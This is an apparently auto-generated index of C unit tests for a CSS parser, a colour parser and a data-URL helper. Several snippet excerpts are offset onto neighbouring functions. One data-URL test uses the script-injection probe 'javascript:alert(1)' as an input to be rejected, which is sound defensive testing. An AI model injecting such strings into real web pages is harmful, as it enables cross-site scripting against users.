- `test_inline_box_longhands` (line 1427) `static void test_inline_box_longhands(void **state)` - *static void test_resolve_null_safe(void **state) { (void)state; /* NULL sheet and NULL tag are safe; everything unset. css_style s = css_resolve(NULL, NULL, NULL, NULL, 0, NULL, 0); assert_int_equal(s.color, -1); assert_int_equal(s.text_align, CSS_ALIGN_UNSET); assert_int_equal(s.display, CSS_DISP_UNSET); assert_int_equal(s.gap, -1); assert_int_equal(s.justify, CSS_JUSTIFY_UNSET); assert_int_equal(s.grid_cols, 0); } /* --- author box model (Hito 23b-3) ---*
- `test_box_shorthand_expansion` (line 1445) `static void test_box_shorthand_expansion(void **state)`
- `test_box_auto_and_centering` (line 1473) `static void test_box_auto_and_centering(void **state)`
- `test_box_units_and_failclosed` (line 1490) `static void test_box_units_and_failclosed(void **state)`
- `test_width_percent_carried_symbolically` (line 1518) `static void test_width_percent_carried_symbolically(void **state)` - *Hito 32: width/max-width percentages are carried SYMBOLICALLY (per-mille in width_pct/max_width_pct; the px channel stays UNSET) and resolved at layout time against the real containing width. Junk still fails closed; every other * % length keeps failing closed.*
- `test_calc_basic_arithmetic` (line 1545) `static void test_calc_basic_arithmetic(void **state)`
- `test_calc_precedence_and_parens` (line 1554) `static void test_calc_precedence_and_parens(void **state)`
- `test_calc_units_and_signs` (line 1561) `static void test_calc_units_and_signs(void **state)`
- `test_calc_dimension_errors_fail_closed` (line 1569) `static void test_calc_dimension_errors_fail_closed(void **state)`
- `test_calc_clamped_anti_dos` (line 1584) `static void test_calc_clamped_anti_dos(void **state)`
- `test_calc_inside_shorthands` (line 1595) `static void test_calc_inside_shorthands(void **state)` - *calc() must survive being ONE token inside a multi-value shorthand: a naive whitespace splitter would break "calc(10px + 5px)" apart at the internal spaces (into "calc(10px", "+", "5px)") before it ever reached interp_len. Exercises every shorthand tokenizer that can hand a token to something calc-aware * (margin/padding, flex, border/outline width, text-shadow, box-shadow).*
- `test_calc_with_custom_property` (line 1632) `static void test_calc_with_custom_property(void **state)`
- `test_box_clamp_anti_dos` (line 1639) `static void test_box_clamp_anti_dos(void **state)`
- `test_inline_min_width_height` (line 1648) `static void test_inline_min_width_height(void **state)` - *(void)state; /* calc() and var() compose: var() substitutes text before calc() is parsed. css_style s = css_parse_inline("--base: 20px; width: calc(var(--base) * 2)", 0); assert_int_equal(s.width, 40); } static void test_box_clamp_anti_dos(void **state) { (void)state; assert_int_equal(css_parse_inline("width:99999999px", 0).width, CSS_LEN_MAX); assert_int_equal(css_parse_inline("margin-top:99999999px", 0).margin_top, CSS_LEN_MAX); assert_int_equal(css_parse_inline("margin-top:-99999999px", 0).margin_top, -CSS_LEN_MAX); } /* --- box model extensions (min-width, height, min-height, max-height) ---*
- `test_inline_min_max_height` (line 1675) `static void test_inline_min_max_height(void **state)`
- `test_box_extension_sheet_cascade` (line 1689) `static void test_box_extension_sheet_cascade(void **state)`
- `test_inline_text_decoration_color_style` (line 1709) `static void test_inline_text_decoration_color_style(void **state)` - *"#s { height:400px }", 0, &sh), CSS_OK); const char *cls[] = { "card" }; css_style s = css_resolve(sh, "div", NULL, cls, 1, NULL, 0); assert_int_equal(s.min_width, 300); assert_int_equal(s.height, 200); assert_int_equal(s.min_height, 100); assert_int_equal(s.max_height, 500); /* Inline wins. css_style t = css_resolve(sh, "div", NULL, cls, 1, "height:250px", 0); assert_int_equal(t.height, 250); css_free(sh); } /* --- text-decoration-color / text-decoration-style ---*
- `test_inline_text_decoration_thickness` (line 1738) `static void test_inline_text_decoration_thickness(void **state)` - */* All style keywords. assert_int_equal(css_parse_inline("text-decoration-style:solid", 0).text_decoration_style, CSS_TDS_SOLID); assert_int_equal(css_parse_inline("text-decoration-style:dotted", 0).text_decoration_style, CSS_TDS_DOTTED); assert_int_equal(css_parse_inline("text-decoration-style:dashed", 0).text_decoration_style, CSS_TDS_DASHED); /* Unknown style -> unset. assert_int_equal(css_parse_inline("text-decoration-style:inherit", 0).text_decoration_style, CSS_TDS_UNSET); /* Default: color -1, style unset. css_style def = css_parse_inline("color:#000", 0); assert_int_equal(def.text_decoration_color, -1); assert_int_equal(def.text_decoration_style, CSS_TDS_UNSET); } /* --- text-decoration-thickness ---*
- `test_inline_aspect_ratio` (line 1755) `static void test_inline_aspect_ratio(void **state)` - */* from-font -> 0 (the painter treats 0 as "default thickness" via cairo). assert_int_equal(css_parse_inline("text-decoration-thickness:from-font", 0).text_decoration_thickness, 0); /* px values. assert_int_equal(css_parse_inline("text-decoration-thickness:1px", 0).text_decoration_thickness, 1); assert_int_equal(css_parse_inline("text-decoration-thickness:3px", 0).text_decoration_thickness, 3); assert_int_equal(css_parse_inline("text-decoration-thickness:0.5em", 0).text_decoration_thickness, 8); /* Negative and percentage dropped (CSS does not allow them). assert_int_equal(css_parse_inline("text-decoration-thickness:-1px", 0).text_decoration_thickness, -1); assert_int_equal(css_parse_inline("text-decoration-thickness:50%", 0).text_decoration_thickness, -1); /* Default. assert_int_equal(css_parse_inline("color:#000", 0).text_decoration_thickness, -1); } /* --- aspect-ratio ---*
- `test_inline_direction` (line 1785) `static void test_inline_direction(void **state)` - *css_style d = css_parse_inline("aspect-ratio:auto", 0); assert_int_equal(d.aspect_num, 0); assert_int_equal(d.aspect_den, 0); /* Bad value -> 0/0 (dropped). css_style e = css_parse_inline("aspect-ratio:abc", 0); assert_int_equal(e.aspect_num, 0); assert_int_equal(e.aspect_den, 0); /* default. css_style def = css_parse_inline("color:#000", 0); assert_int_equal(def.aspect_num, 0); assert_int_equal(def.aspect_den, 0); } /* --- direction ---*
- `test_inline_outline_offset` (line 1794) `static void test_inline_outline_offset(void **state)` - *assert_int_equal(def.aspect_num, 0); assert_int_equal(def.aspect_den, 0); } /* --- direction --- static void test_inline_direction(void **state) { (void)state; assert_int_equal(css_parse_inline("direction:ltr", 0).direction, CSS_DIR_LTR); assert_int_equal(css_parse_inline("direction:rtl", 0).direction, CSS_DIR_RTL); assert_int_equal(css_parse_inline("color:red", 0).direction, CSS_DIR_UNSET); } /* --- outline-offset ---*
- `test_inline_tab_size` (line 1806) `static void test_inline_tab_size(void **state)` - */* --- outline-offset --- static void test_inline_outline_offset(void **state) { (void)state; assert_int_equal(css_parse_inline("outline-offset:2px", 0).outline_offset, 2); assert_int_equal(css_parse_inline("outline-offset:-1px", 0).outline_offset, -1); assert_int_equal(css_parse_inline("outline-offset:0", 0).outline_offset, 0); assert_int_equal(css_parse_inline("outline-offset:2em", 0).outline_offset, 32); assert_int_equal(css_parse_inline("outline-offset:2%", 0).outline_offset, CSS_LEN_UNSET); /* dropped assert_int_equal(css_parse_inline("color:red", 0).outline_offset, CSS_LEN_UNSET); } /* --- tab-size ---*
- `test_box_sheet_cascade_inline_wins` (line 1816) `static void test_box_sheet_cascade_inline_wins(void **state)`
- `test_position_and_insets` (line 1831) `static void test_position_and_insets(void **state)` - *static void test_box_sheet_cascade_inline_wins(void **state) { (void)state; css_sheet *sh = NULL; assert_int_equal(css_parse(".card{max-width:600px;margin:0 auto;padding:24px}", 0, &sh), CSS_OK); const char *cls[] = { "card" }; css_style s = css_resolve(sh, "div", NULL, cls, 1, "padding:40px", 0); assert_int_equal(s.max_width, 600); assert_int_equal(s.margin_left, CSS_LEN_AUTO); assert_int_equal(s.pad_top, 40);   /* inline overrides the sheet assert_int_equal(s.pad_left, 40); css_free(sh); } /* --- Layout / box decoration (Hito 23b-7) ---*
- `test_float_and_clear` (line 1862) `static void test_float_and_clear(void **state)`
- `test_visibility` (line 1886) `static void test_visibility(void **state)`
- `test_overflow` (line 1903) `static void test_overflow(void **state)`
- `test_cursor` (line 1926) `static void test_cursor(void **state)`
- `test_text_overflow_and_word_break` (line 1942) `static void test_text_overflow_and_word_break(void **state)`
- `test_box_sizing` (line 1967) `static void test_box_sizing(void **state)`
- `test_border_shorthand` (line 1975) `static void test_border_shorthand(void **state)`
- `test_border_longhands` (line 2005) `static void test_border_longhands(void **state)`
- `test_box_shadow_and_outline` (line 2031) `static void test_box_shadow_and_outline(void **state)`
- `test_flex_item` (line 2056) `static void test_flex_item(void **state)`
- `test_flex_align` (line 2085) `static void test_flex_align(void **state)`
- `test_grid_extras` (line 2107) `static void test_grid_extras(void **state)`
- `test_layout_sheet_cascade_and_unset` (line 2125) `static void test_layout_sheet_cascade_and_unset(void **state)`
- `test_inline_outline_longhands` (line 2162) `static void test_inline_outline_longhands(void **state)` - *const char *cls[] = { "card" }; css_style s = css_resolve(sh, "div", NULL, cls, 1, "z-index:9", 0); assert_int_equal(s.position, CSS_POS_ABSOLUTE);     /* from sheet assert_int_equal(s.border_top_width, 1); assert_int_equal(s.border_top_style, CSS_BST_SOLID); assert_int_equal(s.z_index, 9);                     /* inline wins css_free(sh); /* Anti-DoS clamp on a flex factor and span. assert_int_equal(css_parse_inline("flex-grow:99999", 0).flex_grow, CSS_FLEX_FACTOR_MAX); assert_int_equal(css_parse_inline("grid-column:span 99999", 0).grid_col_span, CSS_GRID_SPAN_MAX); } /* --- Outline longhands (outline-width/outline-style/outline-color) ---*
- `test_inline_border_collapse` (line 2193) `static void test_inline_border_collapse(void **state)` - *assert_int_equal(css_parse_inline("outline-style:none", 0).outline_style, CSS_BST_NONE); assert_int_equal(css_parse_inline("outline-style:ridge", 0).outline_style, CSS_BST_RIDGE); assert_int_equal(css_parse_inline("outline-style:inset", 0).outline_style, CSS_BST_INSET); assert_int_equal(css_parse_inline("outline-style:outset", 0).outline_style, CSS_BST_OUTSET); assert_int_equal(css_parse_inline("outline-style:auto", 0).outline_style, CSS_BST_UNSET); /* unknown /* outline-color assert_int_equal(css_parse_inline("outline-color:red", 0).outline_color, 0xFF0000); assert_int_equal(css_parse_inline("outline-color:#00FF00", 0).outline_color, 0x00FF00); assert_int_equal(css_parse_inline("outline-color:rgba(0,0,255,0.5)", 0).outline_color, 0x0000FF); assert_int_equal(css_parse_inline("outline-color:auto", 0).outline_color, -1); /* dropped assert_int_equal(css_parse_inline("color:red", 0).outline_color, -1); /* unset } /* --- border-collapse ---*
- `test_inline_border_spacing` (line 2202) `static void test_inline_border_spacing(void **state)` - *assert_int_equal(css_parse_inline("outline-color:auto", 0).outline_color, -1); /* dropped assert_int_equal(css_parse_inline("color:red", 0).outline_color, -1); /* unset } /* --- border-collapse --- static void test_inline_border_collapse(void **state) { (void)state; assert_int_equal(css_parse_inline("border-collapse:collapse", 0).border_collapse, CSS_BCOL_COLLAPSE); assert_int_equal(css_parse_inline("border-collapse:separate", 0).border_collapse, CSS_BCOL_SEPARATE); assert_int_equal(css_parse_inline("border-collapse:auto", 0).border_collapse, CSS_BCOL_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).border_collapse, CSS_BCOL_UNSET); } /* --- border-spacing ---*
- `test_inline_empty_cells` (line 2213) `static void test_inline_empty_cells(void **state)` - *} /* --- border-spacing --- static void test_inline_border_spacing(void **state) { (void)state; assert_int_equal(css_parse_inline("border-spacing:2px", 0).border_spacing, 2); assert_int_equal(css_parse_inline("border-spacing:0", 0).border_spacing, 0); assert_int_equal(css_parse_inline("border-spacing:1em", 0).border_spacing, 16); assert_int_equal(css_parse_inline("border-spacing:10 20", 0).border_spacing, 10); /* first value assert_int_equal(css_parse_inline("border-spacing:auto", 0).border_spacing, CSS_LEN_UNSET); /* dropped assert_int_equal(css_parse_inline("color:red", 0).border_spacing, CSS_LEN_UNSET); } /* --- empty-cells ---*
- `test_inline_caption_side` (line 2222) `static void test_inline_caption_side(void **state)` - *assert_int_equal(css_parse_inline("border-spacing:auto", 0).border_spacing, CSS_LEN_UNSET); /* dropped assert_int_equal(css_parse_inline("color:red", 0).border_spacing, CSS_LEN_UNSET); } /* --- empty-cells --- static void test_inline_empty_cells(void **state) { (void)state; assert_int_equal(css_parse_inline("empty-cells:show", 0).empty_cells, CSS_EC_SHOW); assert_int_equal(css_parse_inline("empty-cells:hide", 0).empty_cells, CSS_EC_HIDE); assert_int_equal(css_parse_inline("empty-cells:auto", 0).empty_cells, CSS_EC_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).empty_cells, CSS_EC_UNSET); } /* --- caption-side ---*
- `test_inline_table_layout` (line 2231) `static void test_inline_table_layout(void **state)` - *assert_int_equal(css_parse_inline("empty-cells:auto", 0).empty_cells, CSS_EC_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).empty_cells, CSS_EC_UNSET); } /* --- caption-side --- static void test_inline_caption_side(void **state) { (void)state; assert_int_equal(css_parse_inline("caption-side:top", 0).caption_side, CSS_CS_TOP); assert_int_equal(css_parse_inline("caption-side:bottom", 0).caption_side, CSS_CS_BOTTOM); assert_int_equal(css_parse_inline("caption-side:left", 0).caption_side, CSS_CS_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).caption_side, CSS_CS_UNSET); } /* --- table-layout ---*
- `test_inline_font_variant` (line 2240) `static void test_inline_font_variant(void **state)` - *assert_int_equal(css_parse_inline("caption-side:left", 0).caption_side, CSS_CS_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).caption_side, CSS_CS_UNSET); } /* --- table-layout --- static void test_inline_table_layout(void **state) { (void)state; assert_int_equal(css_parse_inline("table-layout:auto", 0).table_layout, CSS_TL_AUTO); assert_int_equal(css_parse_inline("table-layout:fixed", 0).table_layout, CSS_TL_FIXED); assert_int_equal(css_parse_inline("table-layout:collapse", 0).table_layout, CSS_TL_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).table_layout, CSS_TL_UNSET); } /* --- font-variant ---*
- `test_inline_hyphens` (line 2249) `static void test_inline_hyphens(void **state)` - *assert_int_equal(css_parse_inline("table-layout:collapse", 0).table_layout, CSS_TL_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).table_layout, CSS_TL_UNSET); } /* --- font-variant --- static void test_inline_font_variant(void **state) { (void)state; assert_int_equal(css_parse_inline("font-variant:small-caps", 0).font_variant, CSS_FV_SMALL_CAPS); assert_int_equal(css_parse_inline("font-variant:normal", 0).font_variant, CSS_FV_NORMAL); assert_int_equal(css_parse_inline("font-variant:all-small-caps", 0).font_variant, CSS_FV_UNSET); /* out of scope assert_int_equal(css_parse_inline("color:red", 0).font_variant, CSS_FV_UNSET); } /* --- hyphens ---*
- `test_inline_user_select` (line 2259) `static void test_inline_user_select(void **state)` - *assert_int_equal(css_parse_inline("color:red", 0).font_variant, CSS_FV_UNSET); } /* --- hyphens --- static void test_inline_hyphens(void **state) { (void)state; assert_int_equal(css_parse_inline("hyphens:none", 0).hyphens, CSS_HY_NONE); assert_int_equal(css_parse_inline("hyphens:manual", 0).hyphens, CSS_HY_MANUAL); assert_int_equal(css_parse_inline("hyphens:auto", 0).hyphens, CSS_HY_AUTO); assert_int_equal(css_parse_inline("hyphens:all", 0).hyphens, CSS_HY_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).hyphens, CSS_HY_UNSET); } /* --- user-select ---*
- `test_inline_caret_color` (line 2270) `static void test_inline_caret_color(void **state)` - *} /* --- user-select --- static void test_inline_user_select(void **state) { (void)state; assert_int_equal(css_parse_inline("user-select:none", 0).user_select, CSS_US_NONE); assert_int_equal(css_parse_inline("user-select:text", 0).user_select, CSS_US_TEXT); assert_int_equal(css_parse_inline("user-select:all", 0).user_select, CSS_US_ALL); assert_int_equal(css_parse_inline("user-select:auto", 0).user_select, CSS_US_AUTO); assert_int_equal(css_parse_inline("user-select:element", 0).user_select, CSS_US_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).user_select, CSS_US_UNSET); } /* --- caret-color ---*
- `test_inline_appearance` (line 2280) `static void test_inline_appearance(void **state)` - *assert_int_equal(css_parse_inline("color:red", 0).user_select, CSS_US_UNSET); } /* --- caret-color --- static void test_inline_caret_color(void **state) { (void)state; assert_int_equal(css_parse_inline("caret-color:red", 0).caret_color, 0xFF0000); assert_int_equal(css_parse_inline("caret-color:#00FF00", 0).caret_color, 0x00FF00); assert_int_equal(css_parse_inline("caret-color:auto", 0).caret_color, CSS_LEN_AUTO); assert_int_equal(css_parse_inline("caret-color:blargh", 0).caret_color, -1); /* unknown -> unset assert_int_equal(css_parse_inline("color:red", 0).caret_color, -1); } /* --- appearance ---*
- `test_inline_pointer_events` (line 2289) `static void test_inline_pointer_events(void **state)` - *assert_int_equal(css_parse_inline("caret-color:blargh", 0).caret_color, -1); /* unknown -> unset assert_int_equal(css_parse_inline("color:red", 0).caret_color, -1); } /* --- appearance --- static void test_inline_appearance(void **state) { (void)state; assert_int_equal(css_parse_inline("appearance:auto", 0).appearance, CSS_AP_AUTO); assert_int_equal(css_parse_inline("appearance:none", 0).appearance, CSS_AP_NONE); assert_int_equal(css_parse_inline("appearance:button", 0).appearance, CSS_AP_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).appearance, CSS_AP_UNSET); } /* --- pointer-events ---*
- `test_table_sheet_cascade` (line 2298) `static void test_table_sheet_cascade(void **state)` - *assert_int_equal(css_parse_inline("appearance:button", 0).appearance, CSS_AP_UNSET); /* unknown assert_int_equal(css_parse_inline("color:red", 0).appearance, CSS_AP_UNSET); } /* --- pointer-events --- static void test_inline_pointer_events(void **state) { (void)state; assert_int_equal(css_parse_inline("pointer-events:auto", 0).pointer_events, CSS_PE_AUTO); assert_int_equal(css_parse_inline("pointer-events:none", 0).pointer_events, CSS_PE_NONE); assert_int_equal(css_parse_inline("pointer-events:all", 0).pointer_events, CSS_PE_UNSET); assert_int_equal(css_parse_inline("color:red", 0).pointer_events, CSS_PE_UNSET); } /* --- Table properties cascade from sheet + inline ---*
- `test_inline_bg_repeat` (line 2313) `static void test_inline_bg_repeat(void **state)` - *(void)state; css_sheet *sh = NULL; assert_int_equal(css_parse("table{border-collapse:collapse;empty-cells:hide;caption-side:bottom;table-layout:fixed}", 0, &sh), CSS_OK); css_element el = { "table", NULL, NULL, 0, NULL, 0, NULL, 0, 0, NULL }; css_style s = css_resolve_el(sh, &el, "border-spacing:4px", 0); assert_int_equal(s.border_collapse, CSS_BCOL_COLLAPSE); assert_int_equal(s.empty_cells, CSS_EC_HIDE); assert_int_equal(s.caption_side, CSS_CS_BOTTOM); assert_int_equal(s.table_layout, CSS_TL_FIXED); assert_int_equal(s.border_spacing, 4); css_free(sh); } /* --- background longhands + background shorthand fix ---*
- `test_inline_bg_size` (line 2324) `static void test_inline_bg_size(void **state)`
- `test_inline_bg_clip_origin_attachment` (line 2333) `static void test_inline_bg_clip_origin_attachment(void **state)`
- `test_inline_isolation` (line 2353) `static void test_inline_isolation(void **state)`
- `test_inline_contain` (line 2361) `static void test_inline_contain(void **state)`
- `test_inline_content_visibility` (line 2376) `static void test_inline_content_visibility(void **state)`
- `test_inline_image_rendering` (line 2385) `static void test_inline_image_rendering(void **state)`
- `test_inline_color_scheme` (line 2394) `static void test_inline_color_scheme(void **state)`
- `test_inline_accent_color` (line 2404) `static void test_inline_accent_color(void **state)`
- `test_inline_print_forced_adjust` (line 2413) `static void test_inline_print_forced_adjust(void **state)`
- `test_inline_mix_blend_mode` (line 2427) `static void test_inline_mix_blend_mode(void **state)` - *static void test_inline_print_forced_adjust(void **state) { (void)state; assert_int_equal(css_parse_inline("print-color-adjust:economy", 0).print_color_adjust, CSS_PCA_ECONOMY); assert_int_equal(css_parse_inline("print-color-adjust:exact", 0).print_color_adjust, CSS_PCA_EXACT); assert_int_equal(css_parse_inline("print-color-adjust:auto", 0).print_color_adjust, CSS_PCA_UNSET); assert_int_equal(css_parse_inline("color:red", 0).print_color_adjust, CSS_PCA_UNSET); assert_int_equal(css_parse_inline("forced-color-adjust:auto", 0).forced_color_adjust, CSS_FCA_AUTO); assert_int_equal(css_parse_inline("forced-color-adjust:none", 0).forced_color_adjust, CSS_FCA_NONE); assert_int_equal(css_parse_inline("forced-color-adjust:preserve", 0).forced_color_adjust, CSS_FCA_UNSET); assert_int_equal(css_parse_inline("color:red", 0).forced_color_adjust, CSS_FCA_UNSET); } /* --- Batch C: mix-blend-mode, object-fit, list-style-position, font-*, etc ---*
- `test_inline_transform_translate` (line 2449) `static void test_inline_transform_translate(void **state)` - *assert_int_equal(css_parse_inline("mix-blend-mode:lighten", 0).mix_blend_mode, CSS_MB_LIGHTEN); assert_int_equal(css_parse_inline("mix-blend-mode:color-dodge", 0).mix_blend_mode, CSS_MB_COLOR_DODGE); assert_int_equal(css_parse_inline("mix-blend-mode:color-burn", 0).mix_blend_mode, CSS_MB_COLOR_BURN); assert_int_equal(css_parse_inline("mix-blend-mode:difference", 0).mix_blend_mode, CSS_MB_DIFFERENCE); assert_int_equal(css_parse_inline("mix-blend-mode:exclusion", 0).mix_blend_mode, CSS_MB_EXCLUSION); assert_int_equal(css_parse_inline("mix-blend-mode:hue", 0).mix_blend_mode, CSS_MB_HUE); assert_int_equal(css_parse_inline("mix-blend-mode:saturation", 0).mix_blend_mode, CSS_MB_SATURATION); assert_int_equal(css_parse_inline("mix-blend-mode:color", 0).mix_blend_mode, CSS_MB_COLOR); assert_int_equal(css_parse_inline("mix-blend-mode:luminosity", 0).mix_blend_mode, CSS_MB_LUMINOSITY); assert_int_equal(css_parse_inline("mix-blend-mode:hard-light", 0).mix_blend_mode, CSS_MB_UNSET); assert_int_equal(css_parse_inline("color:red", 0).mix_blend_mode, CSS_MB_UNSET); } /* transform (M1.2, 2D translate only).*
- `test_inline_transform_scale` (line 2489) `static void test_inline_transform_scale(void **state)` - *assert_int_equal(s.transform_tx, CSS_LEN_UNSET); assert_int_equal(s.transform_ty, CSS_LEN_UNSET); s = css_parse_inline("transform:translate(10%,10%)", 0); /* % unsupported assert_int_equal(s.transform_tx, CSS_LEN_UNSET); s = css_parse_inline("transform:translateX(1px) translateY(2px)", 0); /* v1: one fn only assert_int_equal(s.transform_tx, CSS_LEN_UNSET); s = css_parse_inline("transform:translate(10px,20px,30px)", 0); /* too many args assert_int_equal(s.transform_tx, CSS_LEN_UNSET); s = css_parse_inline("color:red", 0); assert_int_equal(s.transform_tx, CSS_LEN_UNSET); assert_int_equal(s.transform_ty, CSS_LEN_UNSET); } /* transform: scale()/scaleX()/scaleY() (M1.2b), percent-of-identity ints.*
- `test_inline_transform_rotate` (line 2528) `static void test_inline_transform_rotate(void **state)` - *transform: rotate() (M1.2b), whole degrees only (deg suffix mandatory, same * convention as the linear-gradient angle grammar).*
- `test_inline_transform_independent_cascade_combines` (line 2564) `static void test_inline_transform_independent_cascade_combines(void **state)` - *Independent-cascade combination (M1.2b): translate/scale/rotate are separate cascade slots, so two DIFFERENT rules matching the same element -- neither of * which chains functions -- can still combine into one composite transform.*
- `test_inline_object_fit` (line 2577) `static void test_inline_object_fit(void **state)`
- `test_inline_list_style_pos` (line 2588) `static void test_inline_list_style_pos(void **state)`
- `test_inline_font_kerning` (line 2596) `static void test_inline_font_kerning(void **state)`
- `test_inline_text_rendering` (line 2605) `static void test_inline_text_rendering(void **state)`
- `test_inline_font_stretch` (line 2615) `static void test_inline_font_stretch(void **state)`
- `test_inline_resize` (line 2630) `static void test_inline_resize(void **state)`
- `test_inline_scroll_behavior` (line 2640) `static void test_inline_scroll_behavior(void **state)`
- `test_inline_touch_action` (line 2648) `static void test_inline_touch_action(void **state)`
- `test_inline_overscroll_behavior` (line 2657) `static void test_inline_overscroll_behavior(void **state)`
- `test_inline_backface_visibility` (line 2666) `static void test_inline_backface_visibility(void **state)`
- `test_math_min_max_top_level` (line 2676) `static void test_math_min_max_top_level(void **state)` - *assert_int_equal(css_parse_inline("overscroll-behavior:none", 0).overscroll_behavior, CSS_OS_NONE); assert_int_equal(css_parse_inline("overscroll-behavior:scroll", 0).overscroll_behavior, CSS_OS_UNSET); assert_int_equal(css_parse_inline("color:red", 0).overscroll_behavior, CSS_OS_UNSET); } static void test_inline_backface_visibility(void **state) { (void)state; assert_int_equal(css_parse_inline("backface-visibility:visible", 0).backface_visibility, CSS_BF_VISIBLE); assert_int_equal(css_parse_inline("backface-visibility:hidden", 0).backface_visibility, CSS_BF_HIDDEN); assert_int_equal(css_parse_inline("backface-visibility:auto", 0).backface_visibility, CSS_BF_UNSET); assert_int_equal(css_parse_inline("color:red", 0).backface_visibility, CSS_BF_UNSET); } /* --- Math functions min()/max()/clamp() (2026-07-10) ---*
- `test_math_clamp` (line 2687) `static void test_math_clamp(void **state)`
- `test_math_nested_in_calc` (line 2697) `static void test_math_nested_in_calc(void **state)`
- `test_logical_margin_padding` (line 2712) `static void test_logical_margin_padding(void **state)` - *static void test_math_nested_in_calc(void **state) { (void)state; assert_int_equal(css_parse_inline("width:calc(min(10px, 2em) * 2)", 0).width, 20); assert_int_equal(css_parse_inline("width:clamp(1em, calc(2px + 3px), 10px)", 0).width, 16); assert_int_equal(css_parse_inline("width:calc(100px * min(2, 3))", 0).width, 200); /* math functions inside a shorthand token (paren-aware splitter) css_style s = css_parse_inline("margin:min(4px, 1em) max(2px, 8px)", 0); assert_int_equal(s.margin_top, 4); assert_int_equal(s.margin_right, 8); assert_int_equal(s.margin_bottom, 4); assert_int_equal(s.margin_left, 8); } /* --- Logical properties (physical LTR mapping, 2026-07-10) ---*
- `test_logical_inset_and_sizes` (line 2737) `static void test_logical_inset_and_sizes(void **state)`
- `test_place_shorthands` (line 2760) `static void test_place_shorthands(void **state)` - *assert_int_equal(s.inset_left, 1); assert_int_equal(s.inset_bottom, 2); s = css_parse_inline("inline-size:200px; block-size:100px", 0); assert_int_equal(s.width, 200); assert_int_equal(s.height, 100); s = css_parse_inline("min-inline-size:10px; max-inline-size:20px;" "min-block-size:30px; max-block-size:40px", 0); assert_int_equal(s.min_width, 10); assert_int_equal(s.max_width, 20); assert_int_equal(s.min_height, 30); assert_int_equal(s.max_height, 40); } /* --- place-* shorthands + two-value gap (2026-07-10) ---*
- `test_gap_two_value` (line 2782) `static void test_gap_two_value(void **state)`
- `test_font_shorthand` (line 2800) `static void test_font_shorthand(void **state)` - *assert_int_equal(s.row_gap, 10); assert_int_equal(s.gap, 20); s = css_parse_inline("gap:12px", 0); assert_int_equal(s.gap, 12); assert_int_equal(s.row_gap, -1);   /* one value keeps the prior semantics s = css_parse_inline("grid-gap:1px 2px", 0); assert_int_equal(s.row_gap, 1); assert_int_equal(s.gap, 2); /* column-gap is a longhand: never takes two values s = css_parse_inline("column-gap:3px 4px", 0); assert_int_equal(s.gap, -1); } /* --- font shorthand (2026-07-10) ---*
- `test_white_space_break_spaces` (line 2822) `static void test_white_space_break_spaces(void **state)` - *s = css_parse_inline("font:16px sans-serif", 0); assert_int_equal(s.font_scale, 100); assert_int_equal(s.font_family, CSS_FF_SANS); assert_int_equal(s.bold, -1);          /* unmentioned longhands stay unset s = css_parse_inline("font:small-caps 16px serif", 0); assert_int_equal(s.font_variant, CSS_FV_SMALL_CAPS); assert_int_equal(s.font_family, CSS_FF_SERIF); /* size + family are both required; system keywords drop the shorthand assert_int_equal(css_parse_inline("font:caption", 0).font_scale, 0); assert_int_equal(css_parse_inline("font:16px", 0).font_scale, 0); assert_int_equal(css_parse_inline("font:sans-serif", 0).font_family, CSS_FF_UNSET); } /* --- white-space: break-spaces (2026-07-10) ---*
- `main` (line 2826) `int main(void)`

#### `test_css_color.c`
**Path:** `tests/test_css_color.c`

**Functions:**
- `test_null_args` (line 21) `static void test_null_args(void **state)`
- `test_hex_short` (line 27) `static void test_hex_short(void **state)`
- `test_hex_short_alpha` (line 36) `static void test_hex_short_alpha(void **state)`
- `test_hex_long` (line 43) `static void test_hex_long(void **state)`
- `test_hex_long_alpha` (line 52) `static void test_hex_long_alpha(void **state)`
- `test_hex_bad` (line 58) `static void test_hex_bad(void **state)`
- `test_rgb_integer` (line 67) `static void test_rgb_integer(void **state)`
- `test_rgba_integer` (line 76) `static void test_rgba_integer(void **state)`
- `test_rgb_percent` (line 83) `static void test_rgb_percent(void **state)`
- `test_rgb_out_of_range` (line 89) `static void test_rgb_out_of_range(void **state)`
- `test_named` (line 99) `static void test_named(void **state)`
- `test_named_bad` (line 117) `static void test_named_bad(void **state)`
- `test_transparent_currentcolor` (line 125) `static void test_transparent_currentcolor(void **state)`
- `test_hsl` (line 133) `static void test_hsl(void **state)`
- `test_hsl_120` (line 139) `static void test_hsl_120(void **state)`
- `test_hsl_240` (line 146) `static void test_hsl_240(void **state)`
- `test_hsla` (line 153) `static void test_hsla(void **state)`
- `test_hsl_out_of_range` (line 159) `static void test_hsl_out_of_range(void **state)`
- `test_unsupported_syntax` (line 167) `static void test_unsupported_syntax(void **state)`
- `test_pack_unpack` (line 174) `static void test_pack_unpack(void **state)`
- `main` (line 188) `int main(void)`

#### `test_data_url.c`
**Path:** `tests/test_data_url.c`

**Functions:**
- `test_is_data_url_true` (line 22) `static void test_is_data_url_true(void **state)` - *#include <setjmp.h> #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <stdlib.h> #include <string.h> #include <cmocka.h> #include "data_url.h" /* --- du_is_data_url ---*
- `test_is_data_url_false` (line 30) `static void test_is_data_url_false(void **state)`
- `test_payload_basic` (line 42) `static void test_payload_basic(void **state)` - *assert_int_not_equal(du_is_data_url("data:"), 0); } static void test_is_data_url_false(void **state) { (void)state; assert_int_equal(du_is_data_url("https://example.com/logo.png"), 0); assert_int_equal(du_is_data_url("http://example.com"), 0); assert_int_equal(du_is_data_url("javascript:alert(1)"), 0); assert_int_equal(du_is_data_url(""), 0); assert_int_equal(du_is_data_url(NULL), 0); assert_int_equal(du_is_data_url("dat:notdata"), 0); } /* --- du_base64_payload ---*
- `test_payload_no_mediatype` (line 53) `static void test_payload_no_mediatype(void **state)`
- `test_payload_empty` (line 62) `static void test_payload_empty(void **state)`
- `test_payload_not_data_url` (line 72) `static void test_payload_not_data_url(void **state)`
